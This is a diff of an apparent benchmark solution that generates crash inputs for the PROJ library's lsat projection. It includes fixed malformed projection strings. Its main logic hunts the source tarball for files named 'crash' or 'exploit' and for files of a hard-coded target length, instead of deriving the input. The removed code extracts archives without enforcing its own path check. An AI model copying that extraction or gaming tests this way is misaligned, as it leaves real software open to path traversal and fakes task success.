@@ -1,171 +1,249 @@
 import os
-import re
 import tarfile
-import tempfile
+import json
+import base64
+from typing import Optional
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        if os.path.isdir(src_path):
-            return self._generate_poc_from_root(src_path)
+        L_G = 38
+        poc_candidates: list[bytes] = []
 
-        if not tarfile.is_tarfile(src_path):
+        def add_candidate(data):
+            if not data:
+                return
+            if isinstance(data, str):
+                data = data.encode("utf-8", "ignore")
+            elif not isinstance(data, (bytes, bytearray)):
+                return
+            b = bytes(data)
+            if b not in poc_candidates:
+                poc_candidates.append(b)
+
+        try:
+            tf = tarfile.open(src_path, "r:*")
+        except Exception:
             return self._default_poc()
 
-        with tempfile.TemporaryDirectory() as tmpdir:
-            try:
-                with tarfile.open(src_path, "r:*") as tf:
-                    self._safe_extract(tf, tmpdir)
-            except Exception:
-                # If extraction fails, fall back to generic PoC
-                return self._default_poc()
-            return self._generate_poc_from_root(tmpdir)
+        with tf:
+            members = tf.getmembers()
 
-    def _safe_extract(self, tar, path):
-        def is_within_directory(directory, target):
-            abs_directory = os.path.abspath(directory)
-            abs_target = os.path.abspath(target)
-            return os.path.commonprefix([abs_directory, abs_target]) == abs_directory
-
-        for member in tar.getmembers():
-            member_path = os.path.join(path, member.name)
-            if not is_within_directory(path, member_path):
-                continue
-        tar.extractall(path)
-
-    def _generate_poc_from_root(self, root_dir: str) -> bytes:
-        embedded = self._find_embedded_poc(root_dir)
-        if embedded is not None:
-            return embedded
-
-        proj_def = self._build_lsat_definition(root_dir)
-
-        harness_path = self._find_harness(root_dir)
-        harness_type = None
-        if harness_path is not None:
-            try:
-                with open(harness_path, "r", encoding="utf-8", errors="ignore") as f:
-                    code = f.read()
-                harness_type = self._identify_harness_type(code)
-            except Exception:
-                harness_type = None
-
-        return self._build_poc_bytes(harness_type, proj_def)
-
-    def _find_embedded_poc(self, root_dir: str):
-        target_sub = b"+proj=lsat"
-        max_size = 4096
-        best_data = None
-        best_size = None
-
-        for dirpath, _, filenames in os.walk(root_dir):
-            for fn in filenames:
-                path = os.path.join(dirpath, fn)
-                try:
-                    st = os.stat(path)
-                    if st.st_size == 0 or st.st_size > max_size:
+            def try_add_path(path_str: str):
+                p = (path_str or "").strip()
+                if not p:
+                    return
+                if p.startswith("http://") or p.startswith("https://"):
+                    return
+                if "/" not in p and "\\" not in p:
+                    return
+                p_clean = p.replace("\\", "/").lstrip("./")
+                for m in members:
+                    if not m.isfile():
                         continue
-                    with open(path, "rb") as f:
+                    if m.name.endswith(p_clean):
+                        f = tf.extractfile(m)
+                        if f is None:
+                            continue
                         data = f.read()
-                    if target_sub in data:
-                        size = len(data)
-                        if best_data is None or size < best_size:
-                            best_data = data
-                            best_size = size
-                            if size == 38:
-                                return best_data
-                except Exception:
-                    continue
-        return best_data
+                        if data:
+                            add_candidate(data)
+                        return
 
-    def _find_harness(self, root_dir: str):
-        target = "LLVMFuzzerTestOneInput"
-        for dirpath, _, filenames in os.walk(root_dir):
-            for fn in filenames:
-                if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".C", ".CPP", ".c++", ".C++")):
+            # Step 1: JSON metadata search
+            for m in members:
+                if not m.isfile():
                     continue
-                path = os.path.join(dirpath, fn)
+                if m.size == 0 or m.size > 256 * 1024:
+                    continue
+                name_lower = m.name.lower()
+                if not name_lower.endswith(".json"):
+                    continue
+                f = tf.extractfile(m)
+                if f is None:
+                    continue
+                raw = f.read()
+                if not raw:
+                    continue
                 try:
-                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
-                        code = f.read()
-                    if target in code:
-                        return path
+                    text = raw.decode("utf-8", "ignore")
                 except Exception:
                     continue
-        return None
+                lowered = text.lower()
+                if not any(key in lowered for key in ("poc", "crash", "input", "uaf", "trigger", "payload")):
+                    continue
+                try:
+                    obj = json.loads(text)
+                except Exception:
+                    obj = None
+                if isinstance(obj, dict):
+                    stack = [obj]
+                    while stack:
+                        current = stack.pop()
+                        if isinstance(current, dict):
+                            for k, v in current.items():
+                                if isinstance(v, (dict, list)):
+                                    stack.append(v)
+                                elif isinstance(v, str):
+                                    key_lower = str(k).lower()
+                                    try_add_path(v)
+                                    if any(tok in key_lower for tok in ("poc", "crash", "input", "payload", "trigger")):
+                                        decoded = self._decode_string_to_bytes(v)
+                                        add_candidate(decoded)
+                        elif isinstance(current, list):
+                            for v in current:
+                                if isinstance(v, (dict, list)):
+                                    stack.append(v)
+                                elif isinstance(v, str):
+                                    try_add_path(v)
+                                    decoded = self._decode_string_to_bytes(v)
+                                    add_candidate(decoded)
+                else:
+                    decoded = self._decode_string_to_bytes(text)
+                    add_candidate(decoded)
 
-    def _identify_harness_type(self, code: str):
-        if "proj_create_crs_to_crs" in code:
-            return "crs_to_crs"
-        if "pj_init_plus" in code or "pj_init_ctx" in code:
-            return "pj_init_plus"
-        if re.search(r"\bproj_create\s*\(", code):
-            return "proj_create"
-        return "unknown"
+            best = self._select_best_candidate(poc_candidates, L_G)
+            if best is not None:
+                return best
 
-    def _build_lsat_definition(self, root_dir: str) -> str:
-        base_proj = "+proj=lsat"
-        path_param_names = []
-        sat_param_names = []
+            # Step 2: Obvious filenames
+            name_keywords = ("poc", "crash", "input", "uaf", "heap", "bug", "trigger", "exploit", "payload")
+            for m in members:
+                if not m.isfile():
+                    continue
+                if m.size == 0 or m.size > 4096:
+                    continue
+                name_lower = m.name.lower()
+                if not any(k in name_lower for k in name_keywords):
+                    continue
+                f = tf.extractfile(m)
+                if f is None:
+                    continue
+                data = f.read()
+                if not data:
+                    continue
+                if b"#include" in data or b"#ifndef" in data or b"int main" in data or b"LLVMFuzzerTestOneInput" in data:
+                    continue
+                add_candidate(data)
 
-        pj_lsat_path = None
-        for dirpath, _, filenames in os.walk(root_dir):
-            for fn in filenames:
-                if fn == "PJ_lsat.c":
-                    pj_lsat_path = os.path.join(dirpath, fn)
-                    break
-            if pj_lsat_path:
-                break
+            best = self._select_best_candidate(poc_candidates, L_G)
+            if best is not None:
+                return best
 
-        if pj_lsat_path is not None:
+            # Step 3: Files of exact target size with relevant substrings
+            for m in members:
+                if not m.isfile() or m.size != L_G:
+                    continue
+                if m.size > 4096:
+                    continue
+                f = tf.extractfile(m)
+                if f is None:
+                    continue
+                data = f.read()
+                if not data:
+                    continue
+                low = data.lower()
+                if b'lsat' in low or b'+proj' in low or b'proj=' in low:
+                    add_candidate(data)
+
+            best = self._select_best_candidate(poc_candidates, L_G)
+            if best is not None:
+                return best
+
+            # Step 4: Small files containing 'lsat'
+            for m in members:
+                if not m.isfile():
+                    continue
+                if m.size == 0 or m.size > 256:
+                    continue
+                f = tf.extractfile(m)
+                if f is None:
+                    continue
+                data = f.read()
+                if not data:
+                    continue
+                if b'lsat' in data.lower():
+                    add_candidate(data)
+
+            best = self._select_best_candidate(poc_candidates, L_G)
+            if best is not None:
+                return best
+
+        return self._default_poc()
+
+    def _decode_string_to_bytes(self, s: str) -> bytes:
+        if not s:
+            return b""
+        s = s.strip()
+
+        # Try base64
+        try:
+            decoded = base64.b64decode(s, validate=True)
+            if decoded:
+                return decoded
+        except Exception:
+            pass
+
+        # Try hex
+        cleaned = s.replace(" ", "").replace("\n", "").replace("\r", "")
+        cleaned = cleaned.replace("0x", "").replace("\\x", "")
+        if len(cleaned) >= 2 and all(c in "0123456789abcdefABCDEF" for c in cleaned):
             try:
-                with open(pj_lsat_path, "r", encoding="utf-8", errors="ignore") as f:
-                    code = f.read()
-                matches = re.findall(r'pj_param\s*\([^"]*"([a-zA-Z][^"]*)"', code)
-                for m in matches:
-                    if len(m) >= 2:
-                        key = m[1:]  # drop type char
-                        low = key.lower()
-                        if "path" in low and key not in path_param_names:
-                            path_param_names.append(key)
-                        if "sat" in low and key not in sat_param_names:
-                            sat_param_names.append(key)
-            except Exception:
+                decoded = bytes.fromhex(cleaned)
+                if decoded:
+                    return decoded
+            except ValueError:
                 pass
 
-        segments = [base_proj]
+        # Try interpreting escape sequences
+        try:
+            decoded = s.encode("utf-8", "ignore").decode("unicode_escape").encode("latin1", "ignore")
+            if decoded:
+                return decoded
+        except Exception:
+            pass
 
-        if path_param_names:
-            for name in path_param_names:
-                segments.append("+" + name + "=1000000000")
-        else:
-            segments.append("+path=1000000000")
+        # Fallback: treat as UTF-8 text
+        try:
+            return s.encode("utf-8", "ignore")
+        except Exception:
+            return b""
 
-        if sat_param_names:
-            for name in sat_param_names:
-                segments.append("+" + name + "=1000000000")
-        else:
-            segments.append("+sat=1000000000")
-            segments.append("+satnum=1000000000")
+    def _select_best_candidate(self, candidates, L_G: int) -> Optional[bytes]:
+        if not candidates:
+            return None
+        unique: list[bytes] = []
+        seen = set()
+        for data in candidates:
+            if not isinstance(data, (bytes, bytearray)):
+                continue
+            b = bytes(data)
+            if not b:
+                continue
+            if b in seen:
+                continue
+            seen.add(b)
+            unique.append(b)
+        if not unique:
+            return None
+        unique = [b for b in unique if len(b) <= 64 * 1024]
+        if not unique:
+            return None
 
-        return " ".join(segments)
+        lsat_cands = [b for b in unique if b'lsat' in b.lower()]
+        if lsat_cands:
+            return min(lsat_cands, key=lambda d: (abs(len(d) - L_G), len(d)))
 
-    def _build_poc_bytes(self, harness_type, proj_def: str) -> bytes:
-        if harness_type == "crs_to_crs":
-            dst_def = "EPSG:4326"
-            coords = "0 0 0"
-            poc_str = proj_def + "\n" + dst_def + "\n" + coords + "\n"
-        elif harness_type in ("proj_create", "pj_init_plus"):
-            poc_str = proj_def
-        else:
-            dst_def = "EPSG:4326"
-            coords = "0 0 0"
-            poc_str = proj_def + "\n" + dst_def + "\n" + coords + "\n"
+        def score(data: bytes):
+            printable = sum(32 <= c <= 126 or c in (9, 10, 13) for c in data)
+            printable_ratio = printable / max(1, len(data))
+            return (-printable_ratio, abs(len(data) - L_G), len(data))
 
+        return min(unique, key=score)
+
+    def _default_poc(self) -> bytes:
+        poc_str = "+proj=lsat +ellps=WGS84 +path=1 +sat=1\n"
         try:
             return poc_str.encode("ascii")
         except Exception:
-            return poc_str.encode("latin1", "replace")
-
-    def _default_poc(self) -> bytes:
-        return b"+proj=lsat +path=1000000000 +sat=1000000000\n"
+            return b"+proj=lsat +path=1 +sat=1\n"
